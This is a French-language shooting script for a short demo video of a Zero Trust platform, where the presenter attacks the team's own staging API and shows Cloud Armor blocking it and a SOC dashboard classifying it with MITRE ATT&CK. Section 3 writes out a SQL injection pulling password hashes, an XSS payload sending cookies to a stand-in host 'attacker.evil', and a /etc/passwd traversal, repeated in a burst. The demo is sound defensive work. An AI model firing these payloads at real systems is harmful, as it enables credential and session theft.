# Script vidéo démo courte — 2:30 à 3:00, un seul enregistrement continu

> **Différence avec `SCRIPT_VIDEO_JURY.md`** : ce script est **~2x plus court** (2:30-3:00 vs
> 5:00-5:15) et **positionné différemment** — pas une défense de PFE point par point, mais une
> preuve de valeur commerciale compacte : "voici un socle Zero Trust multi-app, en direct,
> attaqué et défendu sous vos yeux". À utiliser pour une présentation devant un public non
> exclusivement académique (jury élargi, démonstration technique, portfolio). Même principe
> directeur que le script long : **rien de pré-calculé, tout est interrogé en direct.**

> **Rôle de ce document** : feuille de régie. Vous manipulez — clavier, souris, terminal,
> navigateur. Minutage serré : répéter au moins une fois à voix haute avant d'enregistrer.

---

## 0. Check-list avant d'enregistrer (2 min, hors vidéo)

```bash
gcloud config set project menal-zero-trust-staging
export API=https://api-staging.menal-sarl.com
export ELSON=https://elson.menal-sarl.com
export DASH=https://dash-staging.menal-sarl.com

curl -s -o /dev/null -w 'menal  -> %{http_code}\n' $API/health
curl -s -o /dev/null -w 'elson  -> %{http_code}\n' $ELSON/api/health
curl -s -o /dev/null -w 'dash   -> %{http_code}\n' $DASH/login
```

- **Vérifier la géolocalisation de l'IP de tournage** : le géo-blocage Cloud Armor (priorité
  410) n'exempte que le chemin exact `/health`, PAS `/api/health` utilisé au §3 comme référence
  "saine". Si `$ELSON/api/health` renvoie déjà `403` dans ce test préliminaire (hors UE/Maghreb/
  Mauritanie et hors IP admin), le contraste "attaque bloquée / requête légitime acceptée" du
  §3 sera cassé — tourner depuis un VPN dans la zone autorisée si besoin, ou remplacer la
  référence par `$ELSON/health` (à vérifier que ce chemin existe et n'est pas lui-même filtré).
- Se connecter une première fois au dashboard **avant** l'enregistrement (cold start du login).
- Terminal plein écran, police 16 pt minimum, thème contrasté.
- Fermer tout ce qui affiche un mot de passe ou un token en clair.
- Ce script suppose un compte dashboard déjà créé — voir `SCRIPT_VIDEO_JURY.md` si besoin de
  contexte sur le login.

---

## 1. Accroche (0:00–0:15)

**À l'écran** : logo MENAL ou schéma d'architecture minimal.

**Narration** (reformulée après revue pitch — accroche par la tension, pas la définition,
~14s à débit normal) :
> « Dans les trois prochaines minutes, je vais attaquer une vraie application en production —
> vol d'identifiants, vol de session, lecture de fichiers système. Vous allez voir, en direct,
> pourquoi ça échoue à chaque fois. »

---

## 2. Preuve d'isolation multi-app (0:15–0:45)

**Vous manipulez le terminal.**

```bash
gcloud iam service-accounts list --project=menal-zero-trust-staging \
  --format="table(email,displayName)" | grep -E "elson|ml-embed"

gcloud projects get-iam-policy menal-zero-trust-staging --format=json \
  | python3 -c "import json,sys; p=json.load(sys.stdin)
[print(b['role']) for b in p['bindings'] if any('elson' in m for m in b['members'])]"
```

**Résultat attendu** : `sa-elson-staging@...` avec exactement `roles/cloudsql.client` +
`roles/logging.logWriter` — rien d'autre.

**À dire** : « Ceci est un socle Zero Trust : deux applications, MENAL et Elson, hébergées sur
la même infrastructure, sans confiance implicite entre elles. Chacune a sa propre identité
cloud, avec le strict minimum de droits — jamais un accès partagé. »

---

## 3. L'attaque en direct (0:45–1:45)

**À l'écran** : terminal plein écran.

> **Correctif technique (revue du 20/08)** : la règle de détection R2 (§4) n'exige un signal
> visible que si **plus de 10 requêtes bloquées depuis la même IP arrivent en 15 minutes**. Les
> 3 commandes ne suffisent pas à elles seules — il faut une vraie rafale, filmée en direct
> (pas de pré-chauffage hors caméra, cohérent avec le principe "rien de pré-calculé" de ce
> script).

```bash
echo "1) Injection SQL"
curl -s -o /dev/null -w 'SQLi -> HTTP %{http_code}\n' \
  "$ELSON/api/users?search=x%27%20UNION%20SELECT%20email%2Cpassword_hash%20FROM%20users--%20-"

echo "2) Vol de session (XSS)"
curl -s -o /dev/null -w 'XSS  -> HTTP %{http_code}\n' \
  "$ELSON/api/phrases?q=%3Cscript%3Efetch('https://attacker.evil/steal?c='%2Bdocument.cookie)%3C/script%3E"

echo "3) Lecture fichier système (LFI)"
curl -s -o /dev/null -w 'LFI  -> HTTP %{http_code}\n' \
  "$ELSON/api/media?f=../../../etc/passwd"

echo "4) Rafale (meme charge x4) - le detecteur exige plus de 10 requetes/15min pour eviter le bruit"
for i in 1 2 3 4; do
  curl -s -o /dev/null -w '  %{http_code} ' "$ELSON/api/users?search=x%27%20UNION%20SELECT%20email%2Cpassword_hash%20FROM%20users--%20-"
  curl -s -o /dev/null -w '%{http_code} ' "$ELSON/api/phrases?q=%3Cscript%3Efetch('https://attacker.evil/steal?c='%2Bdocument.cookie)%3C/script%3E"
  curl -s -o /dev/null -w '%{http_code}\n' "$ELSON/api/media?f=../../../etc/passwd"
done

echo "5) Requête légitime, pour comparaison"
curl -s -o /dev/null -w 'sain -> HTTP %{http_code}\n' "$ELSON/api/health"
```

**Attendu (vérifié le 19/08 avec cette même charge — 13/13 bloquées) : `403` × 15, `200` sur la
référence saine.** 15 requêtes malveillantes au total (3 + 4×3), largement au-dessus du seuil
de 10.

**Narration pendant l'exécution** (une réplique par attaque type, pas un seul bloc — évite le
silence pendant les curl) :
> « Vol d'identifiants — bloqué. » *(après la commande 1)*
> « Vol de session — bloqué. » *(après la commande 2)*
> « Lecture système — bloqué. » *(après la commande 3)*
> « Et une rafale pour dépasser le seuil de détection — parce qu'une seule requête bloquée,
> c'est du bruit ; plusieurs dizaines en quelques minutes, c'est une attaque. » *(pendant la
> boucle #4)*

---

## 4. Le SOC voit et comprend l'attaque (1:45–2:30)

**À l'écran** : navigateur, dashboard déjà connecté, `/detections`.

**Narration :**
> « Ce n'est pas juste bloqué — c'est détecté et classé selon le référentiel mondial des
> techniques d'attaque, MITRE ATT&CK, et attribué automatiquement à la bonne application. »

**Preuve** : la rafale du §3 (15 requêtes, >10 depuis la même IP en 15 min) déclenche la règle
R2 environ 5-15 minutes après (cadence du scheduler + latence de normalisation — cohérent avec
les mesures antérieures). **Tourner le §3 10-15 min avant l'enregistrement du §4**, ou accepter
un plan de coupe (montage) entre les deux. Résultat vérifié le 19/08 avec cette exacte charge :
```
rule_id=R2, entity=<IP source>, service=menal-elson-api-backend-staging
message="15 requetes bloquees par Cloud Armor depuis <IP> en 15 min"
mitre_tactic=TA0040 (Impact), mitre_technique=T1498 (Network DoS)
```

**À dire** : « La colonne "service" montre `menal-elson-api-backend-staging` — l'attaque est
attribuée à l'application précise, pas mélangée avec l'autre. Tactique et technique posées
automatiquement, sans intervention humaine. »

> **Repli si la ligne est trop ancienne au moment du tournage** : basculer sur `/logs` filtré
> `elson-api-staging`, qui montre les requêtes bloquées à la seconde — dire : « la vue agrégée
> met quelques minutes, la preuve brute est immédiate. »

---

## 5. Clôture (2:30–3:00)

**À l'écran** : texte simple.

**Narration :**
> « Attaque, blocage, détection, attribution — tout ce que vous venez de voir était réel, en
> direct, sur une infrastructure qui héberge déjà plusieurs applications de production. C'est
> la preuve, pas la promesse. »

**Carton de fin** (texte affiché après la narration, pas de voix — évite de finir sur une
maxime sans suite pour un contexte commercial) : coordonnées de contact ou lien vers le dépôt/
le rapport, selon le contexte de diffusion de la vidéo (jury élargi, portfolio, démonstration
client).

**Fin.**

---

## Annexe — minutage strict

| Temps | Séquence |
|---|---|
| 0:00–0:15 | Accroche |
| 0:15–0:45 | Isolation multi-app (IAM) |
| 0:45–1:45 | Attaque en direct |
| 1:45–2:30 | Détection SOC + attribution MITRE |
| 2:30–3:00 | Clôture |

**Marge** : si le tournage dépasse 3:00, couper le §2 (IAM) en premier — le §3-4 (attaque →
détection) est le cœur de la preuve, à ne jamais raccourcir.

---

## Annexe — ce qu'il ne faut PAS dire (limites assumées, à garder en tête si question)

Ce format court ne mentionne pas MFA, chiffrement, rétention des données, ni la segmentation
réseau — pas parce qu'ils n'existent pas, mais parce que 3 minutes ne permettent pas de tout
couvrir avec preuve à l'écran. Si la question est posée après la vidéo : renvoyer vers
`SCRIPT_VIDEO_JURY.md` (version longue, couvre MFA/IAM/ML) ou `02_SECURITE_AUDITS_ECARTS.md`
(registre complet, y compris les 3 réserves ouvertes : segmentation réseau multi-tenant, gap WAF
path traversal, 74 findings SAST en cours de triage). **Ne jamais laisser entendre que ce format
court couvre tout** — c'est une preuve ciblée, pas un audit complet filmé.
